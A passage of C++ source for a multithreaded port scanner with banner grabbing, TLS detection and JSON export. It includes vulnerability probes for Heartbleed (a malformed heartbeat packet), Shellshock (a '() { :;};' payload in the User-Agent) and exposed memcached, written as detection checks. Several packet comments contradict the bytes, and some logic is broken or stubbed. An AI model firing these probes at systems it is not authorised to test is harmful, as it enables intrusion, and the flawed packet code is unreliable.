                // Extract first line as banner
                size_t newline = resp.find('\n');
                if (newline != std::string::npos) {
                    banner = resp.substr(0, newline);
                    if (!banner.empty() && banner.back() == '\r') {
                        banner.pop_back();
                    }
                } else {
                    // Return truncated response
                    banner = resp.substr(0, std::min((int)resp.size(), 512));
                }
            }
        }

        close(sock);
        return banner;
    }

    bool detectSSL(const std::string& host, int port) {
        if (!isSSLC_port(port)) {
            return false;
        }

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);

        struct in_addr resolved_ip;
        if (inet_pton(AF_INET, host.c_str(), &resolved_ip) <= 0) {
            addrinfo hints{}, *result;
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            if (getaddrinfo(host.c_str(), nullptr, &hints, &result) != 0) {
                return false;
            }
            addr.sin_addr = ((sockaddr_in*)result->ai_addr)->sin_addr;
            freeaddrinfo(result);
        }

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return false;

        timeval tv{};
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) != 0) {
            close(sock);
            return false;
        }

        // Send TLS ClientHello
        char tls_hello[] = {
            0x16, 0x03, 0x01, 0x00, 0x40,
            0x01, 0x00, 0x00, 0x3c, 0x03, 0x03,
            0x00, 0x01, 0x02, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00
        };
        send(sock, tls_hello, sizeof(tls_hello), 0);
        usleep(300000);

        char response[64]{};
        ssize_t received = recv(sock, response, sizeof(response), 0);
        close(sock);

        // If we get a TLS handshake response (0x16), port is SSL
        return (received > 0 && ((uint8_t*)response)[0] == 0x16);
    }

    void workerThread() {
        // Rate limiting: track last send time
        std::chrono::steady_clock::time_point lastSendTime = std::chrono::steady_clock::now();
        std::chrono::microseconds intervalBetweenPackets = std::chrono::microseconds(0);
        
        if (rateLimitPPS > 0) {
            intervalBetweenPackets = std::chrono::microseconds(1000000 / rateLimitPPS);
        }

        while (true) {
            std::pair<std::string, int> task;
            {
                std::lock_guard<std::mutex> lock(queueMutex);
                if (workQueue.empty()) {
                    if (completedTasks.load() >= totalTasks) {
                        break;
                    }
                    continue;
                }
                task = workQueue.back();
                workQueue.pop_back();
            }

            // Rate limiting: wait if needed
            if (rateLimitPPS > 0) {
                auto now = std::chrono::steady_clock::now();
                auto elapsed = std::chrono::duration_cast<std::chrono::microseconds>(now - lastSendTime);
                if (elapsed < intervalBetweenPackets) {
                    auto waitTime = intervalBetweenPackets - elapsed;
                    std::this_thread::sleep_for(waitTime);
                }
                lastSendTime = std::chrono::steady_clock::now();
            }

            bool isOpen = isPortOpen(task.first, task.second);
            
            // Detect SSL/TLS for common ports
            bool isSSL = isOpen && detectSSL(task.first, task.second);
            
            {
                std::lock_guard<std::mutex> lock(resultsMutex);
                InternalPortResult pr;
                pr.host = task.first;
                pr.port = task.second;
                pr.isOpen = isOpen;
                pr.isSSL = isSSL;
                pr.service = getServiceName(task.second);
                
                // Run version detection if enabled
                if (isOpen && enableVersionDetection) {
                    pr.version = detectVersion(task.first, task.second);
                }
                
                // Run banner grabbing if enabled
                if (isOpen && enableBannerGrabbing) {
                    pr.banner = grabBanner(task.first, task.second);
                }
                
                // Run exploit check if enabled
                if (isOpen && activeExploitCheck != EXPLOIT_NONE) {
                    runExploitCheck(task.first, task.second, pr);
                }
                
                results.push_back(pr);
            }
            
            if (isOpen) {
                openPortsCount++;
                {
                    std::lock_guard<std::mutex> lock(outputMutex);
                    std::cout << "[" << task.first << "] [OPEN] Port " << task.second << " - " << getServiceName(task.second) << std::endl << std::flush;
                }
            }

            completedTasks++;
        }
    }

    void printProgress() {
        if (totalTasks <= 0) return;
        int lastProgress = -1;
        while (true) {
            int completed = completedTasks.load();
            if (completed >= totalTasks) break;
            int progress = (completed * 100) / totalTasks;
            if (progress != lastProgress) {
                std::cout << "\rProgress: " << progress << "% (" 
                          << completed << "/" << totalTasks << ")\r"
                          << std::flush;
                lastProgress = progress;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        // Print final progress
        std::cout << "\rProgress: 100% (" << totalTasks << "/" << totalTasks << ")\r" << std::flush;
        std::cout << std::endl;
    }

    void updateHostStatuses() {
        // After scan completes, update host statuses based on results
        for (size_t h = 0; h < hosts.size(); h++) {
            bool hasOpenPort = false;
            for (const auto& r : results) {
                if (r.host == hosts[h] && r.isOpen) {
                    hasOpenPort = true;
                    break;
                }
            }
            
            if (hasOpenPort) {
                hostStatus[h] = INTERNAL_HOST_STATUS_ONLINE;
            } else {
                // Try to determine if host responded at all
                // Check if any port was scanned for this host
                bool wasScanned = false;
                for (const auto& r : results) {
                    if (r.host == hosts[h]) {
                        wasScanned = true;
                        break;
                    }
                }
                if (wasScanned) {
                    hostStatus[h] = INTERNAL_HOST_STATUS_NO_PORTS;
                } else {
                    hostStatus[h] = INTERNAL_HOST_STATUS_OFFLINE;
                }
            }
        }
    }

public:
    PortScanner(const std::vector<std::string>& hosts, int startPort, int endPort, 
                int timeoutMs, int maxThreads)
        : hosts(hosts), startPort(startPort), endPort(endPort),
          timeoutMs(timeoutMs), maxThreads(maxThreads),
          useSYNScan(false), enableUDPScan(false),
          enableVersionDetection(false), enableBannerGrabbing(false),
          rateLimitPPS(0), activeExploitCheck(EXPLOIT_NONE) {
        hostStatus.resize(hosts.size(), INTERNAL_HOST_STATUS_OFFLINE);
    }

    void scan() {
        std::cout << "Starting scan of " << hosts.size() << " host(s):" << std::endl;
        for (const auto& h : hosts) {
            std::cout << "  - " << h << std::endl;
        }
        std::cout << "Port range: " << startPort << "-" << endPort << std::endl;
        std::cout << "Timeout: " << timeoutMs << "ms, Threads: " << maxThreads << std::endl;
        std::cout << "----------------------------------------" << std::endl;

        // Fill work queue with all host:port combinations
        for (const auto& host : hosts) {
            for (int port = startPort; port <= endPort; port++) {
                workQueue.push_back({host, port});
            }
        }

        totalTasks = static_cast<int>(workQueue.size());
        completedTasks = 0;
        openPortsCount = 0;
        noPortsHostsCount = 0;
        offlineHostsCount = 0;

        // Start progress thread
        std::thread progressThread(&PortScanner::printProgress, this);

        // Start worker threads
        for (int i = 0; i < maxThreads; i++) {
            threads.emplace_back(&PortScanner::workerThread, this);
        }

        // Wait for workers
        for (auto& t : threads) {
            t.join();
        }
        threads.clear();

        // Wait for progress thread
        progressThread.join();

        // Update host statuses based on results
        updateHostStatuses();

        int onlineCount = 0;
        for (const auto& s : hostStatus) {
            if (s == INTERNAL_HOST_STATUS_ONLINE) onlineCount++;
        }

        std::cout << "----------------------------------------" << std::endl;
        std::cout << "Scan complete. Found " << openPortsCount.load() 
                  << " open port(s). " << onlineCount
                  << " ONLINE, " << noPortsHostsCount.load() << " NO-PORTS, "
                  << offlineHostsCount.load() << " OFFLINE host(s)." << std::endl;
    }

    const std::vector<InternalPortResult>& getResults() const {
        return results;
    }

    const std::vector<InternalHostStatus>& getHostStatus() const {
        return hostStatus;
    }

    void addHost(const std::string& host) {
        hosts.push_back(host);
        hostStatus.push_back(INTERNAL_HOST_STATUS_OFFLINE);
    }

    void setSYNScan(bool enable) {
        useSYNScan = enable;
    }

    bool getSYNScan() const {
        return useSYNScan;
    }

    void setEnableVersionDetection(bool enable) {
        enableVersionDetection = enable;
    }

    void setEnableBannerGrabbing(bool enable) {
        enableBannerGrabbing = enable;
    }

    bool getVersionDetectionEnabled() const {
        return enableVersionDetection;
    }

    bool getBannerGrabbingEnabled() const {
        return enableBannerGrabbing;
    }

    void setUDPScan(bool enable) { enableUDPScan = enable; }
    void setVersionDetection(bool enable) { enableVersionDetection = enable; }
    void setBannerGrabbing(bool enable) { enableBannerGrabbing = enable; }
    void setRateLimit(int pps) { rateLimitPPS = pps; }
    void setExploitCheck(ExploitCheck check) { activeExploitCheck = check; }
    ExploitCheck getExploitCheck() const { return activeExploitCheck; }

    // ==================== Exploit Checks ====================
    
    bool checkHeartbleed(const std::string& host, int port) {
        // CVE-2014-0160: OpenSSL Heartbleed Bug
        // Only applicable to port 443 (HTTPS)
        if (port != 443) return false;
        
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        
        struct in_addr resolved_ip;
        if (inet_pton(AF_INET, host.c_str(), &resolved_ip) <= 0) {
            addrinfo hints{}, *result;
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            if (getaddrinfo(host.c_str(), nullptr, &hints, &result) != 0) {
                return false;
            }
            resolved_ip = ((sockaddr_in*)result->ai_addr)->sin_addr;
            freeaddrinfo(result);
        }
        addr.sin_addr = resolved_ip;
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return false;
        
        timeval tv{};
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) != 0) {
            close(sock);
            return false;
        }
        
        // Send TLS ClientHello to establish connection
        uint8_t client_hello[] = {
            0x16, 0x03, 0x01, 0x00, 0xdc,
            0x01, 0x00, 0x00, 0xd8, 0x03, 0x03,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, // Session ID length
            0x00, 0x02, // Cipher suites length
            0x00, 0x2f, // TLS_RSA_WITH_AES_128_CBC_SHA
            0x01, 0x00, // Extensions length
            0x00, 0x00, 0x00, 0x00, 0x00 // Empty extension list
        };
        send(sock, client_hello, sizeof(client_hello), 0);
        usleep(200000);
        
        // Send Heartbeat request (RFC 6520)
        // Type=1 (heartbeat request), Payload length=0x4000 (16384, larger than actual payload)
        uint8_t heartbeat[] = {
            0x18, 0x03, 0x01, 0x00, 0x03,  // TLS record: ContentType=24(0x18), Version=3.1
            0x01,                            // Handshake type=15 (Heartbeat)
            0x00, 0x00, 0x00, 0x03,        // Handshake length
            0x01,                          // Heartbeat type=1 (request)
            0x00, 0x40,                    // Payload length=64 (we claim 64 bytes)
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, // 8 bytes of payload
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41  // 32 bytes total
        };
        
        send(sock, heartbeat, sizeof(heartbeat), 0);
        usleep(200000);
        
        // Read response
        char response[4096]{};
        ssize_t received = recv(sock, response, sizeof(response), 0);
        close(sock);
        
        // If we received more data than expected ( > 32 bytes payload), vulnerable
        // TLS header (5) + Heartbeat header (7) + Payload(32) = 44 bytes minimum
        // If vulnerable, server sends back 64 bytes of memory content
        return (received > 50); // Heuristic: received more than expected
    }
    
    bool checkShellshock(const std::string& host, int port) {
        // CVE-2014-6271: Bash Remote Code Execution via Environment Variables
        // Check on HTTP (80) and HTTPS (443) ports for CGI scripts
        
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        
        struct in_addr resolved_ip;
        if (inet_pton(AF_INET, host.c_str(), &resolved_ip) <= 0) {
            addrinfo hints{}, *result;
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            if (getaddrinfo(host.c_str(), nullptr, &hints, &result) != 0) {
                return false;
            }
            resolved_ip = ((sockaddr_in*)result->ai_addr)->sin_addr;
            freeaddrinfo(result);
        }
        addr.sin_addr = resolved_ip;
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return false;
        
        timeval tv{};
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) != 0) {
            close(sock);
            return false;
        }
        
        // Shellshock payload in User-Agent
        std::string request = "GET /cgi-bin/test HTTP/1.1\r\n"
                             "Host: " + host + "\r\n"
                             "User-Agent: () { :;}; echo VULNERABLE\r\n"
                             "Connection: close\r\n\r\n";
        
        send(sock, request.c_str(), request.size(), 0);
        usleep(300000);
        
        char buffer[2048]{};
        ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        close(sock);
        
        if (received > 0) {
            buffer[received] = '\0';
            return (strstr(buffer, "VULNERABLE") != nullptr);
        }
        return false;
    }
    
    bool checkPolecache(const std::string& host, int port) {
        // Memcached unauthorized access (no CVE, port 11211)
        if (port != 11211) return false;
        
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        
        struct in_addr resolved_ip;
        if (inet_pton(AF_INET, host.c_str(), &resolved_ip) <= 0) {
            addrinfo hints{}, *result;
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_DGRAM;
            if (getaddrinfo(host.c_str(), nullptr, &hints, &result) != 0) {
                return false;
            }
            resolved_ip = ((sockaddr_in*)result->ai_addr)->sin_addr;
            freeaddrinfo(result);
        }
        addr.sin_addr = resolved_ip;
        
        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock < 0) return false;
        
        timeval tv{};
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        // Send "stats\r\n" command
        const char* cmd = "stats\r\n";
        sendto(sock, cmd, strlen(cmd), 0, (sockaddr*)&addr, sizeof(addr));
        
        char response[1024]{};
        sockaddr_in from_addr{};
        socklen_t from_len = sizeof(from_addr);
        ssize_t received = recvfrom(sock, response, sizeof(response) - 1, 0, 
                                     (sockaddr*)&from_addr, &from_len);
        close(sock);
        
        if (received > 0) {
            response[received] = '\0';
            // Memcached responds with stats if accessible
            return (strstr(response, "STAT ") != nullptr);
        }
        return false;
    }
    
    void runExploitCheck(const std::string& host, int port, InternalPortResult& result) {
        if (activeExploitCheck == EXPLOIT_NONE) return;
        if (!result.isOpen) return;
        
        bool vulnerable = false;
        std::string vulnName;
        
        switch (activeExploitCheck) {
            case EXPLOIT_HEARTBLEED:
                vulnerable = checkHeartbleed(host, port);
                vulnName = "Heartbleed (CVE-2014-0160)";
                break;
            case EXPLOIT_SHELLSHOCK:
                vulnerable = checkShellshock(host, port);
                vulnName = "Shellshock (CVE-2014-6271)";
                break;
            case EXPLOIT_POLECACHE:
                vulnerable = checkPolecache(host, port);
                vulnName = "PoleCache (Memcached Unauthorized Access)";
                break;
            default:
                break;
        }
        
        if (vulnerable) {
            result.vulnerabilities.push_back(vulnName);
            
            // Add to exploit results
            InternalExploitResult exploitResult;
            exploitResult.type = activeExploitCheck;
            exploitResult.vulnerable = true;
            exploitResult.description = vulnName;
            exploitResult.severity = 5; // Critical
            
            switch (activeExploitCheck) {
                case EXPLOIT_HEARTBLEED:
                    exploitResult.cve = "CVE-2014-0160";
                    exploitResult.description = "OpenSSL Heartbleed allows reading 64KB of memory";
                    break;
                case EXPLOIT_SHELLSHOCK:
                    exploitResult.cve = "CVE-2014-6271";
                    exploitResult.description = "Bash Remote Code Execution via environment variables";
                    break;
                case EXPLOIT_POLECACHE:
                    exploitResult.cve = "N/A";
                    exploitResult.description = "Memcached exposed without authentication";
                    exploitResult.severity = 4; // High
                    break;
                default:
                    break;
            }
            
            {
                std::lock_guard<std::mutex> lock(resultsMutex);
                exploitResults.push_back(exploitResult);
            }
        }
    }

    std::string getScanTypeString() const {
        if (enableUDPScan) return "udp";
        return useSYNScan ? "syn" : "connect";
    }

    int getStartPort() const { return startPort; }
    int getEndPort() const { return endPort; }
    size_t getHostCount() const { return hosts.size(); }
};

// Static member definition
const int PortScanner::MAX_UDP_PORTS_DEFAULT;

struct CPortResult {
    char* host;
    int port;
    int is_open;
    int is_udp;
    char* service;
    char* version;
    char* banner;
    int ssl;
};

struct ScannerWrapper {
    PortScanner* scanner;
    std::vector<std::string> hosts;
    std::vector<CPortResult> portResults;
    std::vector<InternalHostStatus> hostStatusValues;
};

extern "C" {

ScannerWrapper* scanner_create(const char* hosts_arr[], int hosts_count,
                               int start_port, int end_port,
                               int timeout_ms, int max_threads) {
    if (!hosts_arr || hosts_count <= 0) {
        return nullptr;
    }

    ScannerWrapper* wrapper = new ScannerWrapper();
    
    for (int i = 0; i < hosts_count; i++) {
        if (hosts_arr[i]) {
            wrapper->hosts.push_back(std::string(hosts_arr[i]));
        }
    }

    wrapper->scanner = new PortScanner(wrapper->hosts, start_port, end_port, 
                                        timeout_ms, max_threads);
    return wrapper;
}

void scanner_destroy(ScannerWrapper* scanner) {
    if (scanner) {
        if (scanner->scanner) {
            delete scanner->scanner;
            scanner->scanner = nullptr;
        }
        delete scanner;
    }
}

void scanner_scan(ScannerWrapper* scanner) {
    if (!scanner || !scanner->scanner) return;
    
    scanner->scanner->scan();
    
    const std::vector<InternalPortResult>& results = scanner->scanner->getResults();
    const std::vector<InternalHostStatus>& statuses = scanner->scanner->getHostStatus();
    
    scanner->portResults.clear();
    for (const auto& r : results) {
        CPortResult pr{};
        pr.host = strdup(r.host.c_str());
        pr.port = r.port;
        pr.is_open = r.isOpen ? 1 : 0;
        pr.is_udp = 0;
        pr.ssl = r.isSSL ? 1 : 0;
        pr.service = r.service.empty() ? nullptr : strdup(r.service.c_str());
        pr.version = r.version.empty() ? nullptr : strdup(r.version.c_str());
        pr.banner = r.banner.empty() ? nullptr : strdup(r.banner.c_str());
        scanner->portResults.push_back(pr);
    }
    
    scanner->hostStatusValues.clear();
    for (const auto& s : statuses) {
        scanner->hostStatusValues.push_back(s);
    }
}

int scanner_get_result_count(ScannerWrapper* scanner) {
    if (!scanner) return 0;
    return static_cast<int>(scanner->portResults.size());
}

int scanner_get_host_count(ScannerWrapper* scanner) {
    if (!scanner) return 0;
    return static_cast<int>(scanner->hosts.size());
}

PortResult scanner_get_result(ScannerWrapper* scanner, int index) {
    PortResult empty{};
    if (!scanner || index < 0 || index >= static_cast<int>(scanner->portResults.size())) {
        return empty;
    }
    const CPortResult& cr = scanner->portResults[index];
    empty.host = cr.host;
    empty.port = cr.port;
    empty.is_open = cr.is_open;
    empty.is_udp = cr.is_udp;
    empty.service = cr.service;
    empty.version = cr.version;
    empty.banner = cr.banner;
    empty.ssl = cr.ssl;
    return empty;
}

HostStatus scanner_get_host_status(ScannerWrapper* scanner, int index) {
    if (!scanner || index < 0 || index >= static_cast<int>(scanner->hostStatusValues.size())) {
        return HOST_STATUS_OFFLINE;
    }
    InternalHostStatus status = scanner->hostStatusValues[index];
    switch (status) {
        case INTERNAL_HOST_STATUS_ONLINE: return HOST_STATUS_ONLINE;
        case INTERNAL_HOST_STATUS_NO_PORTS: return HOST_STATUS_NO_PORTS;
        case INTERNAL_HOST_STATUS_OFFLINE: return HOST_STATUS_OFFLINE;
        default: return HOST_STATUS_OFFLINE;
    }
}

void scanner_free_result(PortResult* result) {
    if (!result) return;
    if (result->host) free(result->host);
    if (result->service) free(result->service);
    if (result->version) free(result->version);
    if (result->banner) free(result->banner);
}

void scanner_free_results(PortResult* results, int count) {
    if (!results || count <= 0) return;
    for (int i = 0; i < count; i++) {
        scanner_free_result(&results[i]);
    }
    free(results);
}

void scanner_set_scan_type(ScannerWrapper* wrapper, ScanType type) {
    if (!wrapper || !wrapper->scanner) return;
    wrapper->scanner->setSYNScan(type == SCAN_TYPE_SYN);
    wrapper->scanner->setUDPScan(type == SCAN_TYPE_UDP);
}

void scanner_set_exploit_check(ScannerWrapper* wrapper, ExploitCheck check) {
    if (!wrapper || !wrapper->scanner) return;
    wrapper->scanner->setExploitCheck(check);
}

void scanner_set_enable_version_detection(ScannerWrapper* wrapper, int enable) {
    if (!wrapper || !wrapper->scanner) return;
    wrapper->scanner->setEnableVersionDetection(enable != 0);
}

void scanner_set_enable_banner_grabbing(ScannerWrapper* wrapper, int enable) {
    if (!wrapper || !wrapper->scanner) return;
    wrapper->scanner->setEnableBannerGrabbing(enable != 0);
}

void scanner_set_rate_limit(ScannerWrapper* wrapper, int packets_per_sec) {
    if (!wrapper || !wrapper->scanner) return;
    wrapper->scanner->setRateLimit(packets_per_sec);
}

char* scanner_export_json(ScannerWrapper* wrapper) {
    if (!wrapper || !wrapper->scanner) {
        return strdup("{}");
    }

    const auto& results = wrapper->portResults;
    const auto& statuses = wrapper->hostStatusValues;
    const auto& hosts = wrapper->hosts;
    
    // JSON string escaping
    auto jsonEscape = [](const char* s) -> std::string {
        if (!s) return "";
        std::string result;
        for (const char* p = s; *p; ++p) {
            char c = *p;
            switch (c) {
                case '"':  result += "\\\""; break;
                case '\\': result += "\\\\"; break;
                case '\n': result += "\\n"; break;
                case '\r': result += "\\r"; break;
                case '\t': result += "\\t"; break;
                case '\b': result += "\\b"; break;
                case '\f': result += "\\f"; break;
                default:
                    if (static_cast<unsigned char>(c) < 0x20) {
                        char buf[8];
                        snprintf(buf, sizeof(buf), "\\u%04x", c);
                        result += buf;
                    } else {
                        result += c;
                    }
            }
        }
        return result;
    };

    auto jsonEscapeStr = [&jsonEscape](const std::string& s) -> std::string {
        return jsonEscape(s.c_str());
    };

    // Helper for optional string fields (null if empty)
    auto jsonOptString = [&jsonEscape](const char* s) -> std::string {
        if (!s || s[0] == '\0') return "null";
        return "\"" + jsonEscape(s) + "\"";
    };

    // Get current time in ISO 8601 format
    char timeBuf[64];
    time_t now = time(nullptr);
    struct tm* tm_info = gmtime(&now);
    strftime(timeBuf, sizeof(timeBuf), "%Y-%m-%dT%H:%M:%SZ", tm_info);

    // Count statistics
    int onlineHosts = 0;
    int totalOpenPorts = 0;
    int vulnerablePorts = 0;
    
    for (size_t h = 0; h < statuses.size(); h++) {
        HostStatus status = scanner_get_host_status(wrapper, static_cast<int>(h));
        if (status == HOST_STATUS_ONLINE) onlineHosts++;
    }
    
    for (const auto& pr : results) {
        if (pr.is_open != 0) {
            totalOpenPorts++;
        }
    }

    // Build JSON manually
    std::string json;
    json.reserve(4096); // Pre-allocate for efficiency

    // === scan_info section ===
    json += "{\n";
    json += "  \"scan_info\": {\n";
    json += "    \"scan_type\": \"" + jsonEscapeStr(wrapper->scanner->getScanTypeString()) + "\",\n";
    json += "    \"port_range\": \"" + std::to_string(wrapper->scanner->getStartPort()) + "-" + 
            std::to_string(wrapper->scanner->getEndPort()) + "\",\n";
    json += "    \"timestamp\": \"" + std::string(timeBuf) + "\",\n";
    json += "    \"scan_options\": {\n";
    json += "      \"version_detection\": " + std::string(wrapper->scanner->getVersionDetectionEnabled() ? "true" : "false") + ",\n";
    json += "      \"banner_grabbing\": " + std::string(wrapper->scanner->getBannerGrabbingEnabled() ? "true" : "false") + "\n";
    json += "    }\n";
    json += "  },\n";

    // === hosts section ===
    json += "  \"hosts\": [\n";

    for (size_t h = 0; h < statuses.size(); h++) {
        HostStatus status = scanner_get_host_status(wrapper, static_cast<int>(h));
        std::string statusStr;
        switch (status) {
            case HOST_STATUS_ONLINE:   statusStr = "online"; break;
            case HOST_STATUS_NO_PORTS: statusStr = "no-open-ports"; break;
            default:                   statusStr = "offline"; break;
        }

        json += "    {\n";
        json += "      \"address\": \"" + jsonEscape(hosts[h].c_str()) + "\",\n";
        json += "      \"status\": \"" + statusStr + "\",\n";
        json += "      \"ports\": [\n";

        bool firstPort = true;
        
        // Collect all ports for this host (only open ports are interesting)
        std::vector<const CPortResult*> hostPorts;
        for (const auto& pr : results) {
            std::string hostStr(pr.host);
            if (hostStr == hosts[h]) {
                hostPorts.push_back(&pr);
            }
        }

        // Sort by port number
        std::sort(hostPorts.begin(), hostPorts.end(),
                  [](const CPortResult* a, const CPortResult* b) { return a->port < b->port; });

        for (const auto* pr : hostPorts) {
            if (!firstPort) json += ",\n";
            firstPort = false;
            
            bool isOpen = pr->is_open != 0;
            std::string protocol = "tcp"; // TCP is default
            std::string state = isOpen ? "open" : (pr->is_udp != 0 ? "open|filtered" : "closed");
            std::string service = pr->service ? pr->service : "unknown";
            bool ssl = pr->ssl != 0;
            
            json += "        {\n";
            json += "          \"port\": " + std::to_string(pr->port) + ",\n";
            json += "          \"protocol\": \"" + protocol + "\",\n";
            json += "          \"state\": \"" + state + "\",\n";
            json += "          \"service\": \"" + jsonEscape(service.c_str()) + "\"";
            
            // Optional: version
            if (pr->version) {
                json += ",\n          \"version\": " + jsonOptString(pr->version);
            }
            
            // Optional: banner
            if (pr->banner) {
                json += ",\n          \"banner\": " + jsonOptString(pr->banner);
            }
            
            // SSL/TLS flag
            json += ",\n          \"ssl\": " + std::string(ssl ? "true" : "false");
            
            // Vulnerabilities (placeholder for future exploit checks)
            json += ",\n          \"vulnerabilities\": []\n";
            json += "        }";
        }

        json += "\n      ]\n";
        json += "    }";
        if (h < statuses.size() - 1) json += ",";
        json += "\n";
    }

    json += "  ],\n";

    // === summary section ===
    json += "  \"summary\": {\n";
    json += "    \"total_hosts\": " + std::to_string(statuses.size()) + ",\n";
    json += "    \"online_hosts\": " + std::to_string(onlineHosts) + ",\n";
    json += "    \"total_open_ports\": " + std::to_string(totalOpenPorts) + ",\n";
    json += "    \"vulnerable_ports\": " + std::to_string(vulnerablePorts) + "\n";
    json += "  }\n";
    json += "}\n";

    return strdup(json.c_str());
}

ScanReport* scanner_get_report(ScannerWrapper* wrapper) {
    if (!wrapper || !wrapper->scanner) {
        return nullptr;
    }

    auto* report = new ScanReport();
    
    const auto& results = wrapper->portResults;
    const auto& statuses = wrapper->hostStatusValues;
    
    report->host_count = static_cast<int>(statuses.size());
    report->port_count = static_cast<int>(results.size());
    report->open_count = 0;
    report->vulnerable_count = 0;
    
    // Copy host statuses
    report->host_statuses = new HostStatus[statuses.size()];
    for (size_t i = 0; i < statuses.size(); i++) {
        switch (statuses[i]) {
            case INTERNAL_HOST_STATUS_ONLINE:   report->host_statuses[i] = HOST_STATUS_ONLINE; break;
            case INTERNAL_HOST_STATUS_NO_PORTS: report->host_statuses[i] = HOST_STATUS_NO_PORTS; break;
            default:                            report->host_statuses[i] = HOST_STATUS_OFFLINE; break;
        }
    }
    
    // Copy port results
    report->results = new PortResult[results.size()];
    for (size_t i = 0; i < results.size(); i++) {
        const CPortResult& cr = results[i];
        report->results[i].host = cr.host ? strdup(cr.host) : nullptr;
        report->results[i].port = cr.port;
        report->results[i].is_open = cr.is_open;
        report->results[i].is_udp = cr.is_udp;
        report->results[i].service = cr.service ? strdup(cr.service) : nullptr;
        report->results[i].version = cr.version ? strdup(cr.version) : nullptr;
        report->results[i].banner = cr.banner ? strdup(cr.banner) : nullptr;
        report->results[i].ssl = cr.ssl;
        
        if (cr.is_open != 0) {
            report->open_count++;
        }
    }
    
    // Exploit results (placeholder - not implemented yet)
    report->exploit_results = nullptr;
    
    return report;
}

void scanner_free_report(ScanReport* report) {
    if (!report) return;
    
    if (report->host_statuses) {
        delete[] report->host_statuses;
    }
    
    if (report->results) {
        for (int i = 0; i < report->port_count; i++) {
            if (report->results[i].host) free(report->results[i].host);
            if (report->results[i].service) free(report->results[i].service);
            if (report->results[i].version) free(report->results[i].version);
            if (report->results[i].banner) free(report->results[i].banner);
        }
        delete[] report->results;
    }
    
    if (report->exploit_results) {
        // TODO: Free exploit results when implemented
        delete[] report->exploit_results;
    }
    
    delete report;
}

void scanner_free_json(char* json) {
    if (json) free(json);
}

}
